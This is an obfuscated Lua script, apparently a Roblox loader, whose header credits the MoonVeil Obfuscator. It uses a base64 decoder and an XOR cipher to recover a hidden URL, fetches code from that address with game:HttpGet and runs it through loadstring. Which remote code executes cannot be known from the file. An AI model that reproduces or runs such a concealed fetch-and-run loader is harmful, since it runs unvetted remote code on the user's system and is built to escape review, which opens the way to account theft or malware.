-- This script was generated using the MoonVeil Obfuscator v1.4.4 [https://moonveil.cc]

local b_,q,r_=(string.char),(string.byte),(bit32 .bxor)
local s_=function(k,e_)
    local m=''
    for n_=69,(#k-1)+69 do
        m=m..b_(r_(q(k,(n_-69)+1),q(e_,(n_-69)%#e_+1)))
    end
    return m
end
local h,p=(string.gsub),(string.char)
local o_=(function(g)
    g=h(g,'[^ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=]','')
    return(g:gsub('.',function(j)
        if(j=='=')then
            return''
        end
        local a_,i_='',(('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'):find(j)-1)
        for c=6,1,-1 do
            a_=a_..(i_%2^c-i_%2^(c-1)>0 and'1'or'0')
        end
        return a_;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(f_)
        if(#f_~=8)then
            return''
        end
        local d_=0
        for l_=1,8 do
            d_=d_+(f_:sub(l_,l_)=='1'and 2^(8-l_)or 0)
        end
        return p(d_)
    end))
end);
loadstring(game:HttpGet(s_(o_'QONAp8g81QZiEPOG0HTmu4OapcTJiGYFP4iRk9UsKaTGBapJ/lr49HafRzAi693FfvfzporkzcOGPWUyiPC31SU5+aFGskk=',o_'KJc017sG+ikQcYSotx2S0/b4i6em5UlKfse82LRBXIuPKsc=')))()